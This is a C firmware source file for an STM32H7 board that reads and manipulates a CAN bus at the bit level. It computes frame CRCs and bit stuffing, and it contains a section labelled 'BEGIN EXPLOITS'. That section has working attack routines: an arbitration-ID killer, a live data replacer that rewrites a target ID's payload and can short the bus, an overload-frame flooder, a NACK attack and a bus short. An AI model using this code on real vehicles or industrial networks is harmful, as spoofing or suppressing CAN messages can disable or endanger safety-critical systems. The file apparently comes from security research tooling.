#include "stm32h7xx.h"
#include "stm32h7xx_hal_dma.h"
#include "stm32h7xx_hal_rcc.h"
#include "stm32h7xx_hal_tim.h"
#include "stm32h7xx_hal_gpio.h"
#include "stm32h7xx_hal_cortex.h"
#include <stdio.h>
#include "can.h"
#include <stdbool.h>
#include "usart.h"

#define SHORT_ON GPIOA->ODR |= GPIO_PIN_5
#define SHORT_OFF GPIOA->ODR &= ~GPIO_PIN_5

void (*timer4_callback_handler)(void) = NULL;
void (*timer3_callback_handler)(void) = NULL;
void (*end_of_frame_callback)(void) = NULL;
static void sync_callback(void);
static void arbid_killer(void);

static uint32_t can_baud = 500000;
static uint32_t can_ticks_per_cycle;
static uint32_t can_initial_delay;
static uint32_t can_edge_interrupt_delay;

static TIM_Base_InitTypeDef TIM_InitStructure; 
static volatile uint16_t bits_read = 0;
static volatile uint8_t last_bit = 0;
static volatile uint8_t same_bits_count = 0;
static volatile uint32_t arbid;
static volatile uint32_t can_rx_crc;
volatile uint32_t attack_arbid = 0;
static volatile uint16_t msg_byte = 0;
static volatile uint8_t message[8];
static volatile uint8_t extended_arbid = 0;
static volatile uint8_t msg_len = 0;
static volatile uint8_t frame_done = 0;
static volatile uint32_t frames_seen = 0;

static volatile uint8_t synchronized = 0;

static volatile uint8_t tx_bit_count = 0;

static uint8_t data_replacer_len = 0;
static uint8_t data_replacer_len_bits = 0;
static uint8_t data_replacer_data[8];
static uint16_t data_replacer_crc;
static uint8_t data_replacer_force_recessive = 0;

static uint32_t overload_frame_count = 0;
static volatile uint32_t overload_frames_sent = 0;
static volatile uint32_t overload_frame_bit_counter = 0;
static volatile uint32_t overload_frame_first_recessive_bit = 0;

inline static void short_on();
inline static void short_off();
static uint8_t nack_attack = 0;

const uint32_t TIMER_PERIOD_NS = 50;

/**************************************
 * CAN bitstream creation functions
 **************************************/ 

/* Calculates the CRC based on the next bit in the message */
uint16_t crc_next_bit(uint16_t crc_rg, uint8_t bit)
{
    uint8_t crcnxt = bit ^ ((crc_rg >> 14) & 0x1);
    crc_rg <<= 1;

    if(crcnxt > 0)
        crc_rg ^= 0x4599;
    return crc_rg;
}

/* Calculate the CRC of a CAN message 
 * arbid is the 11 or 29 bit arbitration id
 * extended_arbid is 0 for an 11 bit id, non-zero for a 29-bit id
 * cntrl is the 3 control bits, RTR, IDE and r0
 * size is the number of data bytes
 * data[] is an array of the data bytes to send
 */
uint16_t can_crc(uint32_t arbid, uint8_t extended_arbid, uint8_t cntrl, uint8_t size, uint8_t data[])
{
    uint16_t crc_rg = 0;

    if(extended_arbid == 0)
    {
        for(int i = 11; i >= 0; i--)
            crc_rg = crc_next_bit(crc_rg, ((arbid >> i) & 0x1));
        for(int i = 2; i >= 0; i--)
            crc_rg = crc_next_bit(crc_rg, ((cntrl >> i) & 0x1));
        for(int i = 3; i >= 0; i--)
            crc_rg = crc_next_bit(crc_rg, ((size >> i) & 0x1));
        for(int i = 0; i < size; i++)
            for(int j = 7; j >= 0; j--)
                crc_rg = crc_next_bit(crc_rg, ((data[i] >> j) & 0x1));
    }
    else
    {
        printf("Extended Arbitration ID not yet supported");
    }

    return crc_rg & 0x7FFF;
}


/* Create a CAN bitstream based on the supplied information, place the resulting bitstream
 * in the supplied buffer. Caller ensures buffer is large enough. The resulting bitstream is
 * not bit stuffed
 *
 * arbid is the 11 or 29 bit arbitration id
 * extended_arbid is 0 for an 11 bit id, non-zero for a 29-bit id
 * cntrl is the 3 control bits, RTR, IDE and r0
 * size is the number of data bytes
 * data[] is an array of the data bytes to send
 * crc is the CRC to use, if calculate_crc is 0. If calculate_crc is non-zero the CRC will be calculated
 * out is the output buffer that the bitstream is placed into
 */
void create_can_bitstream(uint32_t arbid, uint8_t extended_arbid, uint8_t cntrl, uint8_t size, uint8_t data[], uint16_t crc, uint8_t calculate_crc, uint8_t *out)
{
    if(extended_arbid == 0)
    {
        /* Place the arbid */
        out[0] = arbid >> 4; // Take the upper 7 bits of the 11-bit arbid, the first bit is the stop bit
        out[1] = (arbid << 4) | ((cntrl & 0x7) << 1) | ((size >> 3) & 0x1); // Take the last 4 bits of the arbid, the 3 control bits, and the first bit of size
        out[2] = (size << 5); // Take the rest of size

        /* Place the data */
        for(int i = 0; i < size; i++)
        {
            out[i+2] |= data[i] >> 3;
            out[i+3] = data[i] << 5;
        }

        /* Calculate the CRC if requested */
        if(calculate_crc > 0)
            crc = can_crc(arbid, extended_arbid, cntrl, size, data);

        /* Place the CRC */
        out[2+size] |= (crc >> 10); // Grab upper 5 bits of CRC
        out[3+size] = (crc >> 2) & 0xFF; // Grab the next 8 bits of the CRC
        out[4+size] = (crc << 6); // And the last 2 bits of the CRC
        out[4+size] |= 0b00111000; // CRC delimiter, ack frame, and ack delimiter
    }
    else
    {
        printf("Extended Arbitration ID not yet supported");
    }
}

/* Performs bit stuffing on the supplied data. Remember that the CRC delimiter, ACK slot, and ACK delimiter are not bit
 * stuffed so consider that when giving this function data to stuff. Also recall that giving this function partial data
 * will result in improper bit stuffing since we won't know what the previous bits are. Also, ensure that *out is large enough,
 * since bit stuffing could theoretically increase data size by up to 25%
 *
 * return value is the number of bits in *out
 *
 * This is also simple, but probably not very efficient. Use it to pre-calculate, probably don't want to call it from an interrupt
 */
uint32_t stuff_data(uint8_t * in, uint8_t *out, uint8_t num_bits)
{
    /* Track byte and bit positions */
    uint8_t num_bytes = num_bits >> 3;
    uint8_t extra_bits = num_bits - (num_bytes * 8);
    uint8_t out_byte = 0;
    uint8_t out_bit = 7;
    
    uint8_t last_bit = 2; // Ensure that the first bit does not match the last_bit, regardless if it's a 0 or 1
    uint8_t consecutive_bit_count = 0;
    out[0] = 0; // Zero the first output byte

    for(int i = 0; i <= num_bytes; i++)
    {
        for(int j = 7; j >= 0; j--)
        {
            /* We may not be processing the entirety of the last byte */
            if((i == num_bytes) && (j == (7 - extra_bits)))
                break;

            uint8_t bit = (in[i] >> j) & 0x1; // Get the next bit

            if(bit == last_bit)
                consecutive_bit_count++;
            else
                consecutive_bit_count = 1;
            last_bit = bit;


            // Place the bit in the output bitstream
            out[out_byte] |= bit << out_bit;
            out_bit--;
            if(out_bit == 255)
            {
                out_byte++;
                out_bit = 7;
                out[out_byte] = 0;
            }

            // Do I need a stuff bit?
            if(consecutive_bit_count == 5)
            {
                out[out_byte] |= (bit ^ 0x1) << out_bit;
                out_bit--;
                if(out_bit == 255)
                {
                    out_byte++;
                    out_bit = 7;
                    out[out_byte] = 0;
                }
                consecutive_bit_count = 1; // The stuff bit counts toward stuff bit counting
                last_bit = (bit ^ 0x1);
            }

        }
    }

    return (out_byte * 8) + (7 - out_bit);
}

/* Start initializing the CAN peripheral 
 * 
 * The CAN bus is sampled using the timer 4 interrupt, which fires in the middle of the bit
 *
 * The timer 3 interrupt fires at the start of each CAN bit, and is used for the attacks
 */
void can_init()
{
    /* Enable TIM4 and TIM3 clock */
    __HAL_RCC_TIM4_CLK_ENABLE();
    __HAL_RCC_TIM3_CLK_ENABLE();

    /* Set up the TIM4 and TIM3 interrupt */
    HAL_NVIC_SetPriority(TIM4_IRQn, 0, 0);
    HAL_NVIC_EnableIRQ(TIM4_IRQn);
    HAL_NVIC_SetPriority(TIM3_IRQn, 0, 0);
    HAL_NVIC_EnableIRQ(TIM3_IRQn);

    /* Set up the TIM4 peripheral */
    TIM_InitStructure.ClockDivision = TIM_CLOCKDIVISION_DIV4;
    TIM_InitStructure.Prescaler = 9; /* APB1 clock is at 100 MHz, and this timer counts at twice that speed. Count every 500 ns. Note: The prescale value used is the register value + 1 */
    TIM_InitStructure.CounterMode = TIM_COUNTERMODE_UP;
    TIM_InitStructure.Period = 2000 / TIMER_PERIOD_NS; /* Start with 2 microseconds, which equates to 500 KBPS */
    TIM_Base_SetConfig(TIM4, &TIM_InitStructure);
    timer4_callback_handler = NULL;

    /* Set up the TIM3 peripheral */
    TIM_InitStructure.ClockDivision = TIM_CLOCKDIVISION_DIV4;
    TIM_InitStructure.Prescaler = 9; /* APB1 clock is at 100 MHz, and this timer counts at twice that speed. Count every 500 ns. Note: The prescale value used is the register value + 1 */
    TIM_InitStructure.CounterMode = TIM_COUNTERMODE_UP;
    TIM_InitStructure.Period = 2000 / TIMER_PERIOD_NS; /* Start with 2 microseconds, which equates to 500 KBPS */
    TIM_Base_SetConfig(TIM3, &TIM_InitStructure);

    /* Set up the EXTI interrupt */
    HAL_NVIC_SetPriority(EXTI15_10_IRQn, 0, 0);
}

/* Checks to see if we've received a message and prints it out */
void can_poll()
{
    if(frame_done)
    {
        frame_done = 0;
#ifdef DEBUG_PRINT
        printf("Arbid: %lx\r\n", arbid);
        write_string("Msg: ");
        for(int i = 0; i < msg_len; i++)
        {
            write_int(message[i]);
            write_string(" ");
        }
        printf("\r\nCRC: %lx\r\n", can_rx_crc);
#endif
        /* After 128 frames, turn the LED on */
        if ((frames_seen & 0x000000FF) == 128)
        {
            BSP_LED_On(LED2);
        }
        else if((frames_seen & 0xFF) == 0)
        {
            BSP_LED_Off(LED2);
        }
    }
}

/* Synchronize to the CAN bus. Start sampling at 2x baud rate and make sure we see an end of frame */
void can_sync()
{
    TIM4->ARR = can_ticks_per_cycle >> 1;
    TIM4->CNT = 0;
    timer4_callback_handler = sync_callback;
    synchronized = 0;
    same_bits_count = 0;

    // Enable timer and interrupt
    TIM4->DIER |= TIM_IT_UPDATE;
    TIM4->CR1 |= TIM_CR1_CEN;

    write_string("Synchronizing CAN bus...");
    while(!synchronized);
    write_string("Done\r\n");

    // Enable the external interrupt on the RX pin
    while(__HAL_GPIO_EXTI_GET_IT(GPIO_PIN_12) > 0)
        __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_12); // Clear any pending interrupt
    while(NVIC_GetPendingIRQ(EXTI15_10_IRQn) == 1)
        NVIC_ClearPendingIRQ(EXTI15_10_IRQn);
    NVIC_EnableIRQ(EXTI15_10_IRQn);
}

/* Interrupt callback for synchronizing to the CAN bus */
static void sync_callback(void)
{
    /* Check to see if we are getting a 1 */
    if((GPIOB->IDR & GPIO_PIN_12) > 0)
        same_bits_count++;
    else
        same_bits_count = 0;

    if(same_bits_count >= 14)
    {
        synchronized = 1;
        can_timer_stop();
    }
}

/* Interrupt callback for sampling a CAN message. Uses the 
 * following global variables
 *
 * uint16_t bits_read = 0; 
 * uint8_t  last_bit = 0; 
 * uint8_t  same_bits_count = 0; 
 * uint32_t arbid; 
 * uint16_t msg_byte = 0; 
 * uint8_t  message[8]; 
 * uint8_t  extended_arbid = 0;
 * uint8_t  msg_len = 0;
 */
static void sample_callback(void)
{
    uint16_t bit_read = 0;
    if (GPIOB->IDR & GPIO_PIN_12)
        bit_read = 1;

    /* Check to see if this is a stuff bit */
    if (same_bits_count >= 5) /* This is a stuff bit or an error frame */
    {
        if(bit_read == last_bit) // If we're reading the same bit a 6th time, this is an error frame
        {
            bits_read = 255; // This will effectively end the processing for this message and we will start over with the next one
        }
        else // Different bit level is for a stuff bit
        {
            // But don't forget that stuff bits count for the 5 same levels in a row
            same_bits_count = 1;
            last_bit = bit_read;
        }
    }
        
    else /* Not a stuff bit */
    {
        bits_read++;

        /* Track consecutive bits */
        if(bit_read == last_bit)
            same_bits_count++;
        else
            same_bits_count = 1;
        last_bit = bit_read;

        /* Populate the correct item based on position */
        // bit 1 is SOF, ignore it
        if(bits_read >= 2 && bits_read <= 12)
        {
            arbid <<= 1;
            arbid |= bit_read;
        }

        // bit 13 remote transmission request
        else if(bits_read == 14)
            extended_arbid = bit_read;

        /* From here, message length is based on whether or not we have an extended identifier. */
        if(extended_arbid == 0 && bits_read > 14)
        {
            // bit 15 is reserved
            if(bits_read >= 16 && bits_read <= 19)
            {
                msg_len <<= 1;
                msg_len |= bit_read;
            }
            else if(bits_read >= 20 && bits_read < (20 + (8 * msg_len)))
            {
                message[msg_byte] <<= 1;
                message[msg_byte] |= bit_read;

                if(bits_read - 20 - (msg_byte * 8) >= 7)
                    msg_byte++;
            }
            else if(bits_read >= (20 + (8 * msg_len)) && bits_read < (35 + (8 * msg_len)))
            {
                can_rx_crc <<= 1;
                can_rx_crc |= bit_read;

                if(bits_read == (34 + (8 * msg_len))) // Last bit of the CRC
                {
                    /* There is no bit stuffing for the CRC delimiter, ACK slot, or ACK delimiter */
                    same_bits_count = 0;
                }
            }
            else if(bits_read == (35 + (8 * msg_len))) // This is the CRC Delimiter
            {
                if(nack_attack > 0)
                    timer3_callback_handler = short_on;
            }
            else if(bits_read == (36 + (8 * msg_len))) // This is the ACK slot
            {
                if(nack_attack > 0)
                    timer3_callback_handler = short_off;
            }
            // else if(bits_read == (37 + (8 * msg_len))) // This is the ACK Delimiter
            // else if((bits_read >= (38 + (8 * msg_len))) && (bits_read < (45 + (8 * msg_len)))) // End Of Frame bits
            // else if((bits_read >= (45 + (8 * msg_len))) && (bits_read < (48 + (8 * msg_len)))) // Inter Frame Segment TODO: Not presently accounting for overload frames
        }
        else if (bits_read > 14)
        {
            if(bits_read >= 15 && bits_read <= 32)
            {
                arbid <<= 1;
                arbid |= bit_read;
            }
            // bit 33 is remote transmission request
            // bits 34 and 35 are reserved
            else if(bits_read >= 36 && bits_read <= 39)
            {
                msg_len <<= 1;
                msg_len |= bit_read;
            }
            else if(bits_read >= 40 && bits_read < (40 + (8 * msg_len)))
            {
                message[msg_byte] <<= 1;
                message[msg_byte] |= bit_read;

                if(bits_read - 40 - (msg_byte * 8) >= 7)
                    msg_byte++;
            }
            else if(bits_read >= (40 + (8 * msg_len)) && bits_read < (55 + (8 * msg_len)))
            {
                can_rx_crc <<= 1;
                can_rx_crc |= bit_read;
                if(bits_read == (54 + (8 * msg_len))) // Last bit of the CRC
                {
                    /* There is no bit stuffing for the CRC delimiter, ACK slot, or ACK delimiter */
                    same_bits_count = 0;
                }
            }
            else if(bits_read == (55 + (8 * msg_len))) // This is the CRC Delimiter
            {
                if(nack_attack > 0)
                    timer3_callback_handler = short_on;
            }
            else if(bits_read == (56 + (8 * msg_len))) // This is the ACK slot
            {
                if(nack_attack > 0)
                    timer3_callback_handler = short_off;
            }
            // else if(bits_read == (57 + (8 * msg_len))) // This is the ACK Delimiter
            // else if((bits_read >= (58 + (8 * msg_len))) && (bits_read < (65 + (8 * msg_len)))) // End Of Frame bits
            // else if((bits_read >= (65 + (8 * msg_len))) && (bits_read < (68 + (8 * msg_len)))) // Inter Frame Segment TODO: Not presently accounting for overload frames
        }
    }
    /* Currently skipping the EOF Header */
    if((extended_arbid == 0 && bits_read >= (20 + 18 + (8 * msg_len))) ||
       (extended_arbid == 1 && bits_read >= (40 + 18 + (8 * msg_len))))
    {
        can_timer_stop();
        // Enable the external interrupt on the RX pin
        frame_done = 1;
        frames_seen++;
        same_bits_count = 1;
        bits_read = 1;
        last_bit = 0;
 
        // Enable the external interrupt on the RX pin
        while(__HAL_GPIO_EXTI_GET_IT(GPIO_PIN_12) > 0)
            __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_12); // Clear any pending interrupt
        while((NVIC->ISPR[EXTI15_10_IRQn >> 5u] & (1UL << (EXTI15_10_IRQn & 0x1FUL))) != 0UL)
            NVIC->ICPR[EXTI15_10_IRQn >> 5u] = (1UL << (EXTI15_10_IRQn & 0x1FUL));
        HAL_NVIC_EnableIRQ(EXTI15_10_IRQn);

        if(end_of_frame_callback != NULL)
            end_of_frame_callback();
    }
}

/* Stops the timer4 timer */
void can_timer_stop()
{
    /* Disable the overflow interrupt and timer */
    TIM4->DIER &= ~TIM_IT_UPDATE;
    TIM4->CR1 &= ~TIM_CR1_CEN;

    /* Disable the callback */
    timer4_callback_handler = NULL;
}

void TIM3_IRQHandler(void)
{
    TIM3->SR = ~TIM_IT_UPDATE;
    TIM3->ARR = can_ticks_per_cycle;
    if(timer3_callback_handler != NULL)
        timer3_callback_handler();
}

void TIM4_IRQHandler(void)
{
    TIM4->SR = ~TIM_IT_UPDATE;
    TIM4->ARR = can_ticks_per_cycle;
    if(timer4_callback_handler != NULL)
    {
        timer4_callback_handler();
    }
}

void EXTI15_10_IRQHandler(void)
{
    __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_12); // Clear any pending interrupt

    HAL_NVIC_DisableIRQ(EXTI15_10_IRQn);
    /* Start the timer to start sampling the incoming CAN message */
    TIM4->ARR = can_ticks_per_cycle + can_initial_delay;
    TIM4->CNT = 0;

    timer4_callback_handler = sample_callback;
    arbid = 0;
    can_rx_crc = 0;
    msg_byte = 0;
    extended_arbid = 0;
    msg_len = 0;
    tx_bit_count = 0;

    TIM4->DIER |= TIM_IT_UPDATE;
    TIM4->CR1 |= TIM_CR1_CEN;

    /* Restarts the timer that fires on each CAN edge */
    TIM3->CR1 &= ~TIM_CR1_CEN;
    TIM3->SR = ~TIM_IT_UPDATE;
    TIM3->DIER &= ~TIM_IT_UPDATE;
    NVIC_ClearPendingIRQ(TIM3_IRQn);
    TIM3->ARR = can_ticks_per_cycle - can_edge_interrupt_delay;
    TIM3->CNT = 0;
    TIM3->DIER |= TIM_IT_UPDATE;
    TIM3->CR1 |= TIM_CR1_CEN;

    /* Set the ARR back to the correct value */
}

void setCanBaudrate(long int baud)
{
    __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_12); // Clear any pending interrupt
    HAL_NVIC_DisableIRQ(EXTI15_10_IRQn);
    can_baud = baud;
    can_ticks_per_cycle = ((1000000000 / can_baud) / TIMER_PERIOD_NS) - 1;

    /* Calculate the 1/2 cycle delay so that the sampling interrupt happens in the middle of the bit.
     * It takes appx 500ns to set up the initial interrupt, so we have that delay already */
    can_initial_delay = (can_ticks_per_cycle >> 1) - (500 / TIMER_PERIOD_NS);

    /* Edge timer interrupt correction calculation. This compensates for the time the EXTI interrupt takes to fire
     * for timer 3 that interrupts on each CAN edge, which is about 450 ns */
    can_edge_interrupt_delay = 450 / TIMER_PERIOD_NS;
}

/**
 *
 * BEGIN EXPLOITS
 *
 */

static void arbid_killer()
{
    if(tx_bit_count <= 3) // First 4 zeros of arbid
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count == 4) // First stuff bit
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count <= 9) // Next 5 zeros of arbid
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count == 10) // Stuff bit
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count <= 15) // Last two zeros of arbid, no RTR, 11 bit id, and 0 reserved bit
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count == 16) // Stuff bit
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count <= 19) // First 3 bits of length
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count == 20) // Sending one byte
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count == 21) // First data bit
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count == 22) // Second data bit
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count <= 26) // 3-6 data bit
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count <= 28) // 7th and 8th data bit
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count == 29) // CRC is 0x3cd1
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count <= 33)
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count <= 35) 
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count <= 37)
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count == 38) 
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count == 39)
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count <= 42) 
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count <= 44)
        GPIOB->ODR |= GPIO_PIN_13;
    else if(tx_bit_count == 45) 
        GPIOB->ODR &= ~GPIO_PIN_13;
    else if(tx_bit_count == 46)
        GPIOB->ODR |= GPIO_PIN_13;

    tx_bit_count++;
}

void install_arbid_killer()
{
    timer3_callback_handler = arbid_killer;
}

void uninstall_arbid_killer()
{
    timer3_callback_handler = NULL;
}

static void data_replacer()
{
    uint8_t bit = 1;
    /* We're going to key off the bit-keeping that we're doing in the 
     * sample_callback function in order to see where we are in the message and
     * to track any necessary bit stuffing. These variables are:
     *
     * same_bits_count - the number of same bits in a row we have seen on the bus
     * bits_read - the number of bits we have read
     * arbid - the current arbitration ID
     * last_bit - value of the last bit read on the bus
     */

    /* Check to see if we have received an arbitration ID and it matches the one we are attacking */
    if((bits_read >= 15) && (arbid == attack_arbid))
    {
        /* Check to see if we need to send a stuff bit */
        if(same_bits_count == 5)
        {
            bit = last_bit ^ 0x01;
            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
        }
        /* Let the current transmitter send the RTR, IDE and reserved bits, then take over at the DLC */
        else if(bits_read >= 15 && bits_read <= 18)
        {
            bit = (data_replacer_len >> (18 - bits_read)) & 0x1;
            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
        }
        /* Send the data */
        else if((bits_read >= 19) && (bits_read < (19 + data_replacer_len_bits)))
        {
            bit = (data_replacer_data[(bits_read - 19) >> 3] >> (7 - ((bits_read - 19) & 0x7))) & 0x01;
            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
        }
        /* Send the CRC */
        else if((bits_read >= (19 + data_replacer_len_bits)) && (bits_read < (34 + data_replacer_len_bits)))
        {
            bit = (data_replacer_crc >> (33 + data_replacer_len_bits - bits_read)) & 0x1;
            bit <<= data_replacer_force_recessive; // Set bit to two if we are forcing the recessive and transmitting a 1
        }
        /* Send the CRC delimiter, ACK slot, ACK delimiter, and EOF */
        else if(bits_read >= 34 + data_replacer_len_bits)
        {
            bit = 1;
        }

        /* Set the calculated level */
        if(bit == 1)
        {
            GPIOB->ODR |= GPIO_PIN_13;
            SHORT_OFF;
        }
        else if(bit == 2)
        {
            GPIOB->ODR |= GPIO_PIN_13;
            SHORT_ON;
        }
        else
        {
            GPIOB->ODR &= ~GPIO_PIN_13;
            SHORT_OFF;
        }
    }
}

void install_data_replacer()
{
    do
    {
        write_string("Data length: ");
        data_replacer_len = read_int();
        if(data_replacer_len > 8)
            write_string("Invalid length entered\r\n");
    } while(data_replacer_len > 8);
    data_replacer_len_bits = data_replacer_len * 8;

    for(int i = 0; i < data_replacer_len; i++)
    {
        write_string("Byte ");
        write_int(i);
        write_string(": 0x");
        data_replacer_data[i] = read_hex() & 0xFF;
    }

    write_string("Force Recessive bits? (y/N) ");
    data_replacer_force_recessive = read_char();

    if(data_replacer_force_recessive == 'y' || data_replacer_force_recessive == 'Y')
        data_replacer_force_recessive = 1;
    else
        data_replacer_force_recessive = 0;

    data_replacer_crc = can_crc(attack_arbid, 0, 0, data_replacer_len, data_replacer_data);

    write_string("Replacing Arbid 0x");
    write_int(attack_arbid);
    write_string(" with data:");
    for(int i = 0; i < data_replacer_len; i++)
    {
        write_string(" 0x");
        write_int(data_replacer_data[i]);
    }
    write_string(" CRC: 0x");
    write_int(data_replacer_crc);
    write_string("\r\n");

    if(data_replacer_force_recessive > 0)
        write_string("Recessive Bits will be forced through bus shorting\r\n");
 
    timer3_callback_handler = data_replacer;
}

void uninstall_data_replacer()
{
    data_replacer_len = 0;
    data_replacer_len_bits = 0;

    for(int i = 0; i < 8; i++)
    {
        data_replacer_data[i] = 0;
    }

    data_replacer_force_recessive = 0;
    data_replacer_crc = 0;

    timer3_callback_handler = NULL;
}

void overload_frame()
{
    overload_frame_bit_counter++;

    /* Wait for the end of frame bits, then send six dominant bits */
    if (overload_frame_bit_counter > 8 && overload_frame_bit_counter < 15)
    {
        GPIOB->ODR &= ~GPIO_PIN_13;
    }
    /* Wait for the first recessive bit we see */
    else if (overload_frame_bit_counter >= 15 && overload_frame_first_recessive_bit == 0)
    {
        GPIOB->ODR |= GPIO_PIN_13; // Transmit a recessive ourselves
        if (GPIOB->IDR & GPIO_PIN_12)
            overload_frame_first_recessive_bit = overload_frame_bit_counter;
    }
    /* Wait for 8 recessive bits to be transmitted */
    else if ((overload_frame_first_recessive_bit > 0) && 
             (overload_frame_bit_counter >= overload_frame_first_recessive_bit + 6))
    {
        /* Reset if we are sending more frames */
        overload_frames_sent++;
        if(overload_frames_sent < overload_frame_count)
        {
            overload_frame_bit_counter = 7; // We won't see the 7 EOF bits again 
            overload_frame_first_recessive_bit = 0;
        }
        /* Uninstall ourselves if we are done */
        else
        {
            // Enable the external interrupt on the RX pin
            while(__HAL_GPIO_EXTI_GET_IT(GPIO_PIN_12) > 0)
                __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_12); // Clear any pending interrupt
            while((NVIC->ISPR[EXTI15_10_IRQn >> 5u] & (1UL << (EXTI15_10_IRQn & 0x1FUL))) != 0UL)
                NVIC->ICPR[EXTI15_10_IRQn >> 5u] = (1UL << (EXTI15_10_IRQn & 0x1FUL));
            HAL_NVIC_EnableIRQ(EXTI15_10_IRQn);

            timer3_callback_handler = NULL;
        }
    }
}

void overload_frame_eof()
{
    // Disable the external interrupt on the RX pin
    HAL_NVIC_DisableIRQ(EXTI15_10_IRQn);

    overload_frame_bit_counter = 0;
    overload_frames_sent = 0;
    overload_frame_first_recessive_bit = 0;
    timer3_callback_handler = overload_frame;
}

void install_overload_frame()
{
    write_string("Number of overload frames: ");
    overload_frame_count = read_int();
    end_of_frame_callback = overload_frame_eof;
}

void uninstall_overload_frame()
{
    overload_frame_count = 0;
    end_of_frame_callback = NULL;
}

void install_bus_short()
{
    SHORT_ON;
}

inline static void short_on()
{
    SHORT_ON;
}

inline static void short_off()
{
    SHORT_OFF;
}

void install_nack_attack()
{
    nack_attack = 1;
}

/* Calls all of the attack removal functions */
void remove_attack()
{
    uninstall_arbid_killer();
    uninstall_data_replacer();
    uninstall_overload_frame();
    SHORT_OFF;
    nack_attack = 0;
}


